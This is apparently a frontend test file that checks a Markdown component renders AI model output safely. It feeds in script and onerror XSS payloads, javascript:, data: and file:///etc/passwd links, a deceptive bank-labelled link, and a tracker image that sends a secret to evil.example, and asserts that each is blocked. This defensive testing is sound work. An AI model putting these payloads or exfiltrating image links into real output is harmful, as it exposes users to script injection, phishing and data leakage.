import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Markdown } from "./Markdown";

function view(text: string) {
  return render(<Markdown text={text} />).container;
}

describe("Markdown renders model text safely", () => {
  it("shows raw HTML as literal text and creates no elements from it", () => {
    const html =
      '<script>alert(1)</script><img src="x" onerror="alert(2)"><iframe src="//evil"></iframe>';
    const container = view(html);

    expect(container.querySelector("script, img, iframe, [onerror]")).toBeNull();
    expect(container.textContent).toContain("<script>alert(1)</script>");
  });

  it("never loads an image, however it is written", () => {
    const container = view(
      '![tracker](https://evil.example/p.png?q=secret)\n\n<img src="https://evil.example/x">',
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[image not shown: tracker]")).toBeInTheDocument();
    expect(container.innerHTML).not.toContain("evil.example/p.png");
  });

  it("makes an http(s) link open in a new tab without opener and shows where it goes", () => {
    const container = view("[the docs](https://docs.example.org/guide?a=1)");
    const link = container.querySelector("a");

    expect(link).toHaveAttribute("href", "https://docs.example.org/guide?a=1");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(container.textContent).toContain("the docs (docs.example.org)");
  });

  it("shows the real host even when the label claims another", () => {
    const container = view("[https://your-bank.example](https://evil.example/login)");

    expect(container.textContent).toContain("(evil.example)");
  });

  it("links a mailto address and shows it", () => {
    const container = view("[write](mailto:help@example.org)");

    expect(container.querySelector("a")).toHaveAttribute("href", "mailto:help@example.org");
    expect(container.textContent).toContain("(help@example.org)");
  });

  it.each([
    "[x](javascript:alert(1))",
    "[x](JaVaScRiPt:alert(1))",
    "[x](data:text/html,<script>alert(1)</script>)",
    "[x](vbscript:msgbox(1))",
    "[x](file:///etc/passwd)",
    "[x](//evil.example/x)",
    "[x](/relative/path)",
    "[x](#fragment)",
    "[x](blob:https://a.example/uuid)",
  ])("does not turn %s into a link", (markdown) => {
    const container = view(markdown);

    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("x");
  });

  it("shows code as text", () => {
    const container = view("```html\n<script>alert(1)</script>\n```\n\n`<b>x</b>`");

    expect(container.querySelector("script, b")).toBeNull();
    expect(container.querySelector("pre code")?.textContent).toContain("<script>alert(1)</script>");
  });

  it("still renders ordinary formatting", () => {
    const container = view("# Title\n\n- one\n- two\n\n**bold**");

    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("strong")?.textContent).toBe("bold");
  });
});
